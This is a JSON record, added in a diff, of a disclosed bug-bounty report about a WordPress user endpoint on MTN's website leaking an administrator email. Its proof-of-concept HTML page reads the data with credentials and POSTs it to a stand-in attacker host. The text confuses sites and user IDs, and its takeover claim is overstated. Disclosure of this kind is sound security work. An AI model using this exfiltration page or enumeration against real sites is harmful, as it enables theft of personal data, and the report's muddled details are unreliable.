@@ -1,0 +1,139 @@
+{
+  "id": 2450685,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDUwNjg1",
+  "url": "https://hackerone.com/reports/2450685",
+  "title": "Unauthorized access to PII leads to Administrator account Takeover",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2024-04-06T22:17:41.220Z",
+  "submitted_at": "2024-04-06T22:17:41.520Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": true,
+    "username": "h0w",
+    "url": "/h0w",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/fhzfzlvq1tflwrj6kpcrlujrnmlo/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 41919,
+    "url": "https://hackerone.com/mtn_group",
+    "handle": "mtn_group",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/4e6ikuxrt34g8b14w2bk53c6vyry/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/4e6ikuxrt34g8b14w2bk53c6vyry/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "MTN Group",
+      "twitter_handle": "",
+      "website": "https://www.mtn.com/",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-02-22T15:48:49.662Z",
+  "bug_reporter_agreed_on_going_public_at": "2025-01-23T15:48:46.716Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nThis vulnerability is present in the `wp-json/wp/v2/users/15` file located in the wordpress directory endpoints. This flaw arises from insufficient restrictions placed on the list of post authors, which can be exploited by remote attackers to obtain sensitive information through wp/v2/users/15 requests attackers can obtain sensitive information in the form of email addresses (PII Leaks) and will be used in `wp-login` to send forget password or brute-force password requests.\n\n**Descriptions:**\nAn cross-origin resource sharing (CORS) policy controls whether and how content running on other domains can perform two-way interaction with the domain that publishes the policy. The policy is fine-grained and can apply access controls per-request based on the URL and other features of the request. If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. This bug could be used to steal users information or force the user to execute unwanted actions. As long that a legit and logged in user is lure to access a attacker controlled HTML page CORS misconfiguration is found on vanillaforums.com as `Access-Control-Allow-Credentials: true`.\n\n**Platform(s) Affected: [website]**\nhttps://www.mtn.com/wp-json/wp/v2/users/15\n\n## Steps To Reproduce:\n  1. Navigate visit hostname or directory on https:\\/\\/www.mtn.com\\/wp-json\\/wp\\/v2\\/users\\/9\n  1. Intercept request to `burp-suite` and you will see unauthenticated APIs `administrator_login` email address exposed\n\n{F3171358}\n\n  3. copy this scripts and save file as `.html` and open in our browsers \n\n```html\n<!DOCTYPE html>\n<html>\n<body>\n<center>\n<h3>Steal administrator PII data!</h3>\n<html>\n<body>\n<button type='button' onclick='cors()'>Exploit</button>\n<p id='demo'></p>\n<script>\nfunction cors() {\nvar xhttp = new XMLHttpRequest();\nxhttp.onreadystatechange = function() {\nif (this.readyState == 4 && this.status == 200) {\nvar a = this.responseText; // Sensitive data from niche.co about user account\ndocument.getElementById(\"demo\").innerHTML = a;\nxhttp.open(\"POST\", \"http://burpcollaborator-intruder-evil.com\", true);// Sending that data to Attacker's website\nxhttp.withCredentials = true;\nconsole.log(a);\nxhttp.send(\"data=\"+a);\n}\n};\nxhttp.open(\"GET\", \"https://www.mtn.com/wp-json/wp/v2/users/15\", true);\nxhttp.withCredentials = true;\nxhttp.send();\n}\n</script>\n</body>\n</html>\n```\n{F3171366}\n\n\n## Supporting Material/References:\n  * It's possible to remove this access for anyone by change the source code where when someone request the Rest API and the server send a 404 (Not Found) message for the user who made the request.\n  * It's also possible to create a rewrite rule on `.htaccess` (if the webserver it's Apache) to redirect any request that contain rest_route (eg.: \"^.rest_route=/wp-json/wp/v2/users/15\") to a Not Found (404) or a Default Page.\n\n## Impact\n\n1. Attacker get sensitive information PII Leaks (email adress)\n 1. Attacker can brute-force the password use the valid administrator login\n 1. CORS Misconfiguration, could lead to disclosure of sensitive information\n * Attacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server.\n * This website using Wordpress , so developer forget to enable authenticator in the APIs that can view information of admin user. By access to this link, attacker can get `username` and `email_address` and other information of user admin.",
+  "weakness": {
+    "id": 75,
+    "name": "Privilege Escalation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 3171358,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/eml9w3242aouaajavyum1c9de40o?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ65VHY4Z7%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T172743Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHgaCXVzLXdlc3QtMiJHMEUCIQCyg%2B5Ssf9GRU59%2Bkync2bOt7x6A4WYOE2EWe8N9ua8DgIgSNulINmRAv2Bt0wwr8UYwa5xpgMH6LtJxEneNLUcFRsqugUI8f%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDOTz%2FpGvx8cQysomJiqOBS99Jtfa15bKJomjTK5QnIoppnlQkyD4rjs%2FsJTgjQoYAXbWi7xejVNGhvBzQi4ad2dUQIYFs7OAzdT%2FUllZvMfuZpYyWOg3l04gn1q%2BRyvMLsBr%2FbOr%2BqcwAlNBKJpnd%2BgSEHRk1fsnuCuN1whhpTdUc6mxHlyDoEnZDNZKENrXz7QOuc2yv9ZXCJE%2BmssW9ffIQK3n%2FlQOeh31Ss2Wlrp1TQSVOxUFVgGA2G%2BXb7THpC7A9IZN7juETY1FNPV2ve52kdkpdpl9yphdTxuVrxvd5AYAhkzMmBXxEwR1Cj1yovx0IunZaV879Bazbm%2BcfHZgwys5Qat2muSFv9NFAiayu63r9kkgSXKRgJTBSo27EVJ0hLPmeHl5pSs3%2B3z7Rz3K2JTWBJKacaNrY4ityJHG0lChY3AiUUEQfm6FH56HSdUCzlRhCgRXw7vHnhxfH8Pm2LwZpJ1qxaE%2ByXIQZ%2Fbkdw8aXV5z5Idg213EEC0ILR4vgn1Orzbwl0g1%2FrOTESYLHasy0wcLKIa7%2Bx5GsybsaztcM%2FaeDIkgmyDHrE8dmUM4OGGoFrEiLptvi4ipQTfOnZv%2FW8L0DmN1mCew0ZGuLQoDefflIXeN3js453tCYkgw47FLq5o3XWx7t83rShJXDkk9Z67O91QPdHoajRK2WUBEfSdSx0K4ZP%2BUUnEyFH7UNpgQ0RGtT1YKDRo6DnWUZNpFUV72FrTG%2B%2B%2BWhirUXxnwzxtN49el9oy%2B6Zp%2FjfTVEDNdGnKmLX4Rp5BzUPGHXo9%2F2M76%2Fo9gaYWPekSq%2B%2FGwN9jyRLHBAVa1AwiFHx8rdMSBE9uFPnYCooXI%2BCZoWzutS%2B%2B6zqgl2eAD1hzd7%2FXRzzh9u64VTZ3tijDbnrvGBjqxARFf0E54%2BgdK7Dqw81sRnbmFvMlT3dHf%2BiqrwGKs4KOFIaHkwmBzOVE3vpsUIrNUgO920xXt4Wxnl%2BYVYIiB%2BzXNbT46JlZcZk%2FbfkQJG9TKQLeemXNwhR3OPAW0ypnaTobqy2zzn8d3dbTbKWbz5CaaRn%2B%2BgyNRP2zWb6y7hi4GhpVQS4%2FKbVxoNvkNg6OpFGsFaCjVmQzDmM300a0zrZ2shsdclYZacrrYxRPYPrAzDg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ed923916e7a9e4fddac7e2356790af7bc3bff29585bd9aedb69a0d417681abc3",
+      "file_size": 138218,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 3171366,
+      "file_name": "CORS.gif",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/fp1tzcg4i4iitlpzmsbt3ibi102k?response-content-disposition=attachment%3B%20filename%3D%22CORS.gif%22%3B%20filename%2A%3DUTF-8%27%27CORS.gif&response-content-type=image%2Fgif&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ65VHY4Z7%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T172743Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHgaCXVzLXdlc3QtMiJHMEUCIQCyg%2B5Ssf9GRU59%2Bkync2bOt7x6A4WYOE2EWe8N9ua8DgIgSNulINmRAv2Bt0wwr8UYwa5xpgMH6LtJxEneNLUcFRsqugUI8f%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDOTz%2FpGvx8cQysomJiqOBS99Jtfa15bKJomjTK5QnIoppnlQkyD4rjs%2FsJTgjQoYAXbWi7xejVNGhvBzQi4ad2dUQIYFs7OAzdT%2FUllZvMfuZpYyWOg3l04gn1q%2BRyvMLsBr%2FbOr%2BqcwAlNBKJpnd%2BgSEHRk1fsnuCuN1whhpTdUc6mxHlyDoEnZDNZKENrXz7QOuc2yv9ZXCJE%2BmssW9ffIQK3n%2FlQOeh31Ss2Wlrp1TQSVOxUFVgGA2G%2BXb7THpC7A9IZN7juETY1FNPV2ve52kdkpdpl9yphdTxuVrxvd5AYAhkzMmBXxEwR1Cj1yovx0IunZaV879Bazbm%2BcfHZgwys5Qat2muSFv9NFAiayu63r9kkgSXKRgJTBSo27EVJ0hLPmeHl5pSs3%2B3z7Rz3K2JTWBJKacaNrY4ityJHG0lChY3AiUUEQfm6FH56HSdUCzlRhCgRXw7vHnhxfH8Pm2LwZpJ1qxaE%2ByXIQZ%2Fbkdw8aXV5z5Idg213EEC0ILR4vgn1Orzbwl0g1%2FrOTESYLHasy0wcLKIa7%2Bx5GsybsaztcM%2FaeDIkgmyDHrE8dmUM4OGGoFrEiLptvi4ipQTfOnZv%2FW8L0DmN1mCew0ZGuLQoDefflIXeN3js453tCYkgw47FLq5o3XWx7t83rShJXDkk9Z67O91QPdHoajRK2WUBEfSdSx0K4ZP%2BUUnEyFH7UNpgQ0RGtT1YKDRo6DnWUZNpFUV72FrTG%2B%2B%2BWhirUXxnwzxtN49el9oy%2B6Zp%2FjfTVEDNdGnKmLX4Rp5BzUPGHXo9%2F2M76%2Fo9gaYWPekSq%2B%2FGwN9jyRLHBAVa1AwiFHx8rdMSBE9uFPnYCooXI%2BCZoWzutS%2B%2B6zqgl2eAD1hzd7%2FXRzzh9u64VTZ3tijDbnrvGBjqxARFf0E54%2BgdK7Dqw81sRnbmFvMlT3dHf%2BiqrwGKs4KOFIaHkwmBzOVE3vpsUIrNUgO920xXt4Wxnl%2BYVYIiB%2BzXNbT46JlZcZk%2FbfkQJG9TKQLeemXNwhR3OPAW0ypnaTobqy2zzn8d3dbTbKWbz5CaaRn%2B%2BgyNRP2zWb6y7hi4GhpVQS4%2FKbVxoNvkNg6OpFGsFaCjVmQzDmM300a0zrZ2shsdclYZacrrYxRPYPrAzDg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=41352ce79b62f1e841c148e6c0121f5b64906691f058a6741cf3d19f53120108",
+      "file_size": 7481992,
+      "type": "image/gif",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2025-02-22T15:48:47.032Z",
+  "allow_singular_disclosure_after": -18149936.908892833,
+  "singular_disclosure_allowed": true,
+  "vote_count": 76,
+  "voters": [
+    "pinkmeimei",
+    "aboalezz",
+    "newday_newlife",
+    "k0ns0l",
+    "zsir",
+    "loaymorad",
+    "pippybear",
+    "starlox",
+    "mikelly",
+    "raslanco",
+    "and 66 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 34306,
+    "asset_type": "URL",
+    "asset_identifier": "mtn.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
